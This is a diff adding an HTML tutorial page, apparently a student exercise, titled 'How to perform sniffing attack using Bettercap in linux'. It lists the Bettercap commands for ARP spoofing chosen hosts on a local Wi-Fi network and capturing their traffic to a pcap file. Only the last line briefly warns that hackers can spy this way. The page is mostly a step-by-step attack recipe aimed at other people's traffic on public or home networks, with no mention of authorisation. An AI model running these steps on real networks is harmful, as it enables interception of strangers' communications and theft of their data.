@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <div>
+    <div ></div>
+<h4>Topic</h4>
+<h2>How to perform sniffing attack using Bettercap in linux</h2>
+<i>By Bipesh kapri</i>
+
+<br>
+<br>
+<br>
+<div class="ce">
+<P>Firstly Open an terminal Using CTRL + ALT + T  then type</P>
+<em>sudo bettercap</em>
+<p>To get  start you should have internet connect of your nearbyrouter </p>
+<p>Then type </p>
+<em>net.probe on</em>
+<p>net.probe on used to identify the host(users) in Local Wifi Network</p>
+<p>After getting users(host) in your terminal select ips to sniff them </p>
+<p>and Type</p>
+<em>help arp.spoof</em>
+<p>help arp.spoof use to list all possible parameter for arp.spoof</p>
+<p>There are 4 possible parameter.Four of them we only need two at this moment</p>
+<i> arp.spoof.fullduplex</i>
+<i>arp.spoof.targets</i>
+<p>we only use two of them</p>
+<p>Then Type</p>
+<em>set arp.spoof.fullduplex true  </em>
+<i>//Make Default false into True</i>
+<br>
+<em>set arp.spoof.targets target_ip </em>
+<i>//e.g 192.168.1.100</i>
+<br>
+<em>arp.spoof on </em>
+
+<p>Now the time for sniffing attack</p>
+<p>we use net.sniff parameter in bettercap for sniffing</p>
+<p>Type:</p>
+<em> set net.sniff.verbose true</em>
+<i>you can list all possible parameter by typing</i>
+<em>help net.sniff</em>
+<p>Set an output file for capture data. The extension should be in .pcap</p>
+<em> set net.sniff.output /path/for/file/ </em>
+<i>eg  set net.sniff.output /home/user/Desktop/demo.pcap</i>
+<p>then Run parameter by Typing</p>
+<em>net.sniff on</em>
+
+<h3>In that cases you can capture the host data easier in public or home network .In other word it is an dangerous method that hacker can spying your activies of online.</h3>
+</div>
+</div>
+
+</body>
+</html>
